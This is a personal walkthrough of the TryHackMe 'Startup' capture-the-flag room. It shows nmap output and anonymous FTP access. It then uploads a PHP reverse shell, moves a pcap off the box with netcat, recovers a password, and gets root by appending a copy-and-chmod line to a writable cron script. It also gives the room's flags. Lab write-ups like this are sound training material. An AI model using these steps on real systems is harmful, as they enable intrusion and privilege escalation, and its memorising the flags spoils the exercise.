
#CTF #Easy 

https://tryhackme.com/r/room/startup

```
10.10.74.52

nmap

21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.13.77.248
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http
|_http-title: Maintenance

startup.thm

nothing in source code

ftp 10.10.74.52
anonymous
password: [enter]

drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt

get important.jpg = blank
get notice.txt
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.

Maya
key word is 'share'

gobuster

/files

http://startup.thm/files/

/ftp/
important.jpg
notice.txt

file upload on the server

nc -nlvp 1337

sign into the ftp again
cd ftp/
put reverse-shell.php

check browser ftp/
reverse-shell.php

click on php

which python
stabile the shell

ls
recipe.txt
cat recipe.txt

Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.

ls -la
incidents/
ls
suspicious.pcapng

nc -nvlp 4444 > sus.pcap

nc 10.10.195.84 4444 < suspicious.pcapng

wireshark sus.pcapng

http > click on http > follow stream

someone tried a rev shell
GET /files/ftp/shell.php HTTP/1.1
Host: 192.168.33.10

filter: tcp.port==4444

c4ntg3t3n0ughsp1c3

-- back to terminal rev shell tab
cd /home
ls
lennie/
need permissions to cd 

su lennie
c4ntg3t3n0ughsp1c3

# we're in!
cd lennie
ls -la
cat user.txt

THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

# need priv esc
cd scripts
ls
planner.sh  
	/etc/print.sh
startup_list.txt = blank

ls -la /etc/print.sh
have permissions

echo "cp /root/* /home/lennie; chmod 777 /home/lennie/*" >> /etc/print.sh

cd /home
cd lennie/
ls

cat root.txt

THM{f963aaa6a430f210222158ae15c3d76d}

```

stablize a shell
```
python3 -c 'import pty;pty.spawn("/bin/bash");'
export TERM=xterm
ctrl z
stty raw -echo; fg
stty rows 38 columns 116
```

```
What is the secret spicy soup recipe? FTP and HTTP
love

What are the contents of user.txt?
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}

What are the contents of root.txt?
THM{f963aaa6a430f210222158ae15c3d76d}
```

https://www.youtube.com/watch?v=3qNxI1OggGc